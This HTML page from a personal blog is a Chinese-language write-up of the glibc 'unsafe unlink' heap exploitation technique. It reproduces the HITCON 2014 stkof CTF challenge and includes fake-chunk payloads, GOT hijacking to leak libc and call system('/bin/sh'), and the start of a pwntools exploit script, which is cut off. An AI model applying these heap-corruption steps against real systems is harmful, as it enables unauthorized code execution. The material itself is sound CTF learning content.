<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Heap Exploitation-unlink | HalloH's Blog</title><meta name="author" content="HalloH"><meta name="copyright" content="HalloH"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Heap Exploitation - unsafe unlink原理unlink是glibc里的一个宏，是一段代码片段，通常在内存管理系统中使用。为了避免堆内存过度碎片化，当一个非fast bins的堆块被释放时，libc会查看前后堆块是否是释放状态，是就取出合并，这就是unlink。 unlink主要是从双向链表结构中移除一个节点，该节点通常用于跟踪空闲内存块。目的是将某一空闲的chunk从其">
<meta property="og:type" content="article">
<meta property="og:title" content="Heap Exploitation-unlink">
<meta property="og:url" content="https://ha1loh.github.io/article/6fb0.html">
<meta property="og:site_name" content="HalloH&#39;s Blog">
<meta property="og:description" content="Heap Exploitation - unsafe unlink原理unlink是glibc里的一个宏，是一段代码片段，通常在内存管理系统中使用。为了避免堆内存过度碎片化，当一个非fast bins的堆块被释放时，libc会查看前后堆块是否是释放状态，是就取出合并，这就是unlink。 unlink主要是从双向链表结构中移除一个节点，该节点通常用于跟踪空闲内存块。目的是将某一空闲的chunk从其">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045523.jpg">
<meta property="article:published_time" content="2023-12-18T12:06:20.000Z">
<meta property="article:modified_time" content="2023-12-22T16:06:37.706Z">
<meta property="article:author" content="HalloH">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045523.jpg"><link rel="shortcut icon" href="/img/icon.png"><link rel="canonical" href="https://ha1loh.github.io/article/6fb0.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Heap Exploitation-unlink',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2023-12-23 00:06:37'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312221045523.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="HalloH's Blog"><span class="site-name">HalloH's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Heap Exploitation-unlink</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-18T12:06:20.000Z" title="发表于 2023-12-18 20:06:20">2023-12-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-22T16:06:37.706Z" title="更新于 2023-12-23 00:06:37">2023-12-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Heap Exploitation-unlink"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Heap-Exploitation-unsafe-unlink"><a href="#Heap-Exploitation-unsafe-unlink" class="headerlink" title="Heap Exploitation - unsafe unlink"></a>Heap Exploitation - unsafe unlink</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>unlink是glibc里的一个宏，是一段代码片段，通常在内存管理系统中使用。为了避免堆内存过度碎片化，当一个非fast bins的堆块被释放时，libc会查看前后堆块是否是释放状态，是就取出合并，这就是unlink。</p>
<p>unlink主要是从双向链表结构中移除一个节点，该节点通常用于跟踪空闲内存块。目的是将某一空闲的chunk从其所处的bin中脱链。在malloc_consolidate()函数中将fast bins中的空闲chunk，整理到unsorted bins中，在malloc()函数中用于将unsorted bins中的空闲chunk整理到small bins中或者large bins中，以及在malloc()中获得堆空间时，均可能调用unlink()宏。</p>
<p>在执行free()时会执行int_free()函数，int_free()函数中调用了unlink宏</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">	_int_free()&#123;</span><br><span class="line">		unlink();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>unlink源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)	</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))</span><br><span class="line">	      malloc_printerr (check_action,</span><br><span class="line">			       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,</span><br><span class="line">			       P, AV);</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)		</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在源码中，首先会通过<code>     FD = P-&gt;fd; BK = P-&gt;bk;</code>来将前向和后向指针分别存储。然后进行错误检查，执行<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code>来调整P节点前后的指针，绕过P来移除P节点。之后会检查节点的大小，对更大的节点有额外的检查和调整方法，由于large bins中的一个bin会包含不同大小的chunk，所以还会额外处理fd_nextsize和bk_nextsize。</p>
<p>ulink过程图示：</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326909.png" alt="unlink_smallbin_intro"></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>简单来说，由于C语言通过计算偏移来寻找相应的结构体成员，就算堆块的某些成员变量被篡改，libc仍然会认为该位置就是原来的数据，那么就可以通过unlink这一操作来指向伪造的fake fd和fake bk。</p>
<p>这里简单说一下原理，然后通过复现例题理解。</p>
<h3 id="检查机制"><a href="#检查机制" class="headerlink" title="检查机制"></a>检查机制</h3><p>在unlink前会检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk != P || BK-&gt;fd != P</span><br></pre></td></tr></table></figure>

<p>简单来说就是检查前置结点的fd指针和后置结点的bk指针指向的是否都是该结点</p>
<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
<li>UAF（Use After Free），可修改 free 状态下 small bins 或是 unsorted bins 的 fd 和 bk 指针</li>
<li>已知位置存在一个指针指向可进行UAF的chunk</li>
</ol>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>虽然有检查机制，但是还是比较容易绕过的，设指向可 UAF chunk 的指针的地址为 ptr</p>
<ul>
<li><p>修改 fd 为 ptr - 0x18</p>
</li>
<li><p>修改 bk 为 ptr - 0x10</p>
</li>
<li><p>触发 unlink</p>
</li>
</ul>
<p>ptr 处的指针会变为 ptr - 0x18。</p>
<h2 id="示例复现"><a href="#示例复现" class="headerlink" title="示例复现"></a>示例复现</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">2014 HITCON stkof</a></p>
<h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>检查保护，64位开启NX和Canary</p>
<p>函数逻辑就是，检查输入的数字，输入数字执行对应的函数。</p>
<p>输入1进入函数，会申请一个对应输入大小的chunk，并将chunk的内存指针存储到一个变量中，判断chunk是否创建成功，成功就会将该变量放在bss段的一个未初始化变量中，并输出成功分配的内存块数量。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">size = atoll(s);</span><br><span class="line">v2 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> ( !v2 )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">globals[++cnt] = v2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)cnt);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>

<p>输入2进入对应函数，首先接收输入，判断对应输入下边的位置是否有chunk，如果有就将再次接收输入，使用fread函数将输入的字符写入地址处，如果输入一个不限制长度的字符串就会造成堆溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">idx = atol(s);</span><br><span class="line"><span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">size = atoll(s);</span><br><span class="line">ptr = globals[idx];</span><br><span class="line"><span class="keyword">for</span> ( i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1uLL</span>, size, <span class="built_in">stdin</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  ptr += i;</span><br><span class="line">  size -= i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入3会进入释放chunk的函数，如果输入的下标有被创建的chunk就释放。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">fgets(s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">idx = atol(s);</span><br><span class="line"><span class="keyword">if</span> ( idx &gt; <span class="number">0x100000</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line"><span class="keyword">if</span> ( !globals[idx] )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line"><span class="built_in">free</span>(globals[idx]);</span><br><span class="line">globals[idx] = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>

<h4 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h4><h5 id="1"><a href="#1" class="headerlink" title="1"></a>1</h5><p>先申请一个chunk，查看chunk可以看到有四个</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326922.png" alt="image-20231130183608342"></p>
<p>第二个是申请的chunk，可以看到申请了0x20的空间（user data 10 + prev_size 8 + size 8），显示0x21是因为prev_inuse标志位为1。能看到还有另外三个chunk，最后一个size很大的是top chunk。</p>
<blockquote>
<p>整个堆会在初始化后被当成一个free chunk，成为top chunk，每次用户申请内存时，如果bins中没有合适的chunk，就会从top chunk中进行划分，如果top chunk的大小不够，则调用brk()拓展堆的大小。然后从新的top chunk中进行划分。</p>
</blockquote>
<p>第一个和第三个实际上是由于程序本身没有进行setbuf操作，所以在初次使用fget()和printf()执行输入输出时会申请缓冲区。</p>
<p>那这样就不能利用chunk1进行操作了，chunk1是被两个输入输出申请的chunk包住了，没法利用，也不好利用，不如直接再申请两个chunk2和chunk3，这时候再申请的两个chunk就是连在一起的了，就方便操作，然后用chunk2来溢出到chunk3，执行流程就比较好控制了。</p>
<p>接下来需要分析一下溢出的效果是什么，如何控制。</p>
<h5 id="2"><a href="#2" class="headerlink" title="2"></a>2</h5><p>之前知道在编辑时可以构造堆溢出，比如申请三个chunk，编辑第二个，让第二个溢出到第三个。</p>
<p>申请三个chunk分别为chunk1、chunk2、chunk3，编辑第二个chunk，将其内容改为48字节大小的内容。</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326938.png" alt="image-20231212204344316"></p>
<p>能够看到chunk3消失了</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326928.png" alt="image-20231212204053662"></p>
<p>查看chunk2地址的内容可知，未修改前chunk2地址的内容：</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326934.png" alt="image-20231212204127065"></p>
<p>修改后chunk2地址的内容</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326960.png" alt="image-20231212204220845"></p>
<p>其实就是由于溢出，chunk3的prev_size和size被修改了，导致了识别的上的问题（可能），不过查看0x602140处存放chunk地址的数组发现chunk3也消失了，此处还没弄清楚，应该也是原来指向的地址被修改了导致的。但是确定了可以利用溢出来修改chunk3的chunk头信息。</p>
<p>实际做题中，第一个chunk的大小无所谓，因为用不到。第二个chunk最好是0x30，第三个不能小于0x80，防止free掉被放到fast bins中。</p>
<h5 id="3"><a href="#3" class="headerlink" title="3"></a>3</h5><p>利用方法，简单来说就是在chunk2内的data部分来伪造一个chunk，伪造为释放状态，利用堆溢出修改后一个chunk也就是这里的chunk3的prev_size和size，将chunk3的prev_size修改为伪造的chunk大小，并将size的P位置0，以此来绕过检查并触发unlink，触发unsafe unlink。</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326527.png" alt="image-20231214175058501"></p>
<p>构造fake chunk：</p>
<ul>
<li>prev_size：prev_size这里实际上与chunk2相关，但是是不需要合并chunk2的，所以prev_size置零即可</li>
<li>size：fake chunk只需要fd和bk来完成unlink，而由于需要伪造为释放状态，即P位为0，所以为0x20</li>
</ul>
<p>接下来要构造fake chunk的fd和bk。</p>
<p>在这里需要将0x602140的作为一个chunk来看，将其作为BK。将0x602138处的数据也作为chunk来看，也就是FD。</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326571.png" alt="image-20231216102410933"></p>
<p>让fake chunk的fd指针指向0x602140，并让bk指针指向0x602138。</p>
<p>为什么要这么设置呢？前面说过：</p>
<blockquote>
<p>由于C语言通过计算偏移来寻找相应的结构体成员，就算堆块的某些成员变量被篡改，libc仍然会认为该位置就是原来的数据</p>
</blockquote>
<p>在源码中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//取要脱链结点的fd指针和bk指针</span></span><br><span class="line">FD = P-&gt;fd;</span><br><span class="line">BK = P-&gt;bk;</span><br><span class="line"><span class="comment">//检查</span></span><br><span class="line">FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</span><br><span class="line"><span class="comment">//脱链操作</span></span><br><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>

<p>也就是说，bk指针是通过 + 0x18来找到的，fd指针是通过起始地址 + 0x10来找到的，二者均通过计算偏移来寻找成员，那么就可以将上面的代码理解为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk == P &lt;=&gt; *(p-&gt;fd+<span class="number">0x18</span>) == P</span><br><span class="line">P-&gt;bk-&gt;fd == P &lt;=&gt; *(p-&gt;bk+<span class="number">0x10</span>) == P</span><br></pre></td></tr></table></figure>

<p>那么就可以设置fd和bk如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P-&gt;fd = &amp;P<span class="number">-0x18</span></span><br><span class="line">P-&gt;bk = &amp;P<span class="number">-0x10</span></span><br></pre></td></tr></table></figure>

<p>这样实际上就完成了对检查的绕过，利用偏移寻找结构体成员时，找到的仍旧是正确的结点，但是fd和bk指向的是bss段某处的地址。</p>
<p>这样的话就可以利用已有条件，将fd和bk修改指向为可以控制的某段空间，在这里就是已知的bss段。</p>
<p>前面分析源码已知了global数组的地址为0x602140，就可以按以下进行设置：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">target = <span class="number">0x602140</span> + <span class="number">0x10</span>    <span class="comment">//global[2]</span></span><br><span class="line">fd = target - <span class="number">0x18</span>          <span class="comment">//P-&gt;fd指向0x602138</span></span><br><span class="line">bk = target - <span class="number">0x10</span>			<span class="comment">//P-&gt;bk指向0x602140</span></span><br></pre></td></tr></table></figure>

<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326600.png" alt="image-20231216102911951"></p>
<p>修改chunk2后，fake chunk就与FD和BK构造了一个双向链表。</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326633.png" alt="image-20231216103127670"></p>
<p>第一个payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line"><span class="comment">#fake chunk的prev_size和size，size的P位置0</span></span><br><span class="line">payload1 += p64(fd) + p64(bk)</span><br><span class="line"><span class="comment">#设置fd和bk</span></span><br><span class="line">payload1 += <span class="string">&quot;a&quot;</span> * <span class="number">0x10</span></span><br><span class="line"><span class="comment">#填充剩余的空间</span></span><br><span class="line">payload1 += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"><span class="comment">#修改chunk3的prev_size和size分别为fake chunk的大小和size的P位置0</span></span><br></pre></td></tr></table></figure>

<p>修改后效果</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326662.png" alt="image-20231217182807698"></p>
<p>查看chunk2和chunk3</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326778.png" alt="image-20231217183154218"></p>
<h5 id="4"><a href="#4" class="headerlink" title="4"></a>4</h5><p>构造好了fake chunk就要想办法触发unlink，这里再次说明一下unlink是如何实现的。</p>
<p>在上面构造了fake chunk，以此来实现绕过检测，并将bk和fd指针指向可写的bss段上，并且现在chunk3的prev_size已经被设置为了fake chunk的大小，size的prev_inuse也被置0。此时free掉chunk3，glibc检查chunk3的chunk头就会发现是free状态，将上一个chunk也就是fake chunk拿出来进行合并。</p>
<p>fake chunk就会被从刚才构造的双向链表中摘除，摘除过程中会执行<code>FD-&gt;bk = BK; BK-&gt;fd =FD;</code></p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326917.png" alt="image-20231216104136377"></p>
<p>实际上改变的是同一处的地址，但是由于先后顺序，最终被改为0x602138，此时我们就控制了0x602138到0x602150之间，可以在这段区域来继续进行操作。</p>
<p>free掉chunk3即可，gdb调试看一下。</p>
<p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222326989.png" alt="image-20231217183513869"></p>
<p>成功控制了这段内存区域。</p>
<h5 id="5"><a href="#5" class="headerlink" title="5"></a>5</h5><p>控制这段区域后，由于该题没有后门，需要泄露libc基址。</p>
<p>而由于之前按将原本global数组中存放chunk2地址的位置改写为了0x602138，所以实际上如果修改chunk2的内容是不会写入到chunk2内的，会写到0x602138处。</p>
<p>那么就可以通过修改chunk2来对global数组来进行部署函数的GOT表地址，再次修改global数组时就会修改GOT表中的真实地址。实现GOT表劫持。</p>
<p>第二个payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload2 += p64(free_got) + p64(puts_got) + p64(atoi_got)</span><br></pre></td></tr></table></figure>

<p>布置好后，由于chunk0处为free函数的GOT表地址，可以将其修改为put函数的PLT地址，这样调用free就会调用puts函数。如果释放chunk1，就会实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">free(chunk1) -&gt; free(puts_got) -&gt; puts(puts_got)</span><br></pre></td></tr></table></figure>

<p>将puts函数的真实地址输出。并利用真实地址计算偏移得出system函数的真实地址和binsh的真实地址。</p>
<p>最后还是老一套，将chunk2的atoi函数GOT地址改为system函数地址，调用atoi就会调用system函数，等待输入时输入&#x2F;bin&#x2F;sh地址，就是调用system(&#x2F;bin&#x2F;sh)，getshell。</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;gnome-terminal&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc_chunk</span>(<span 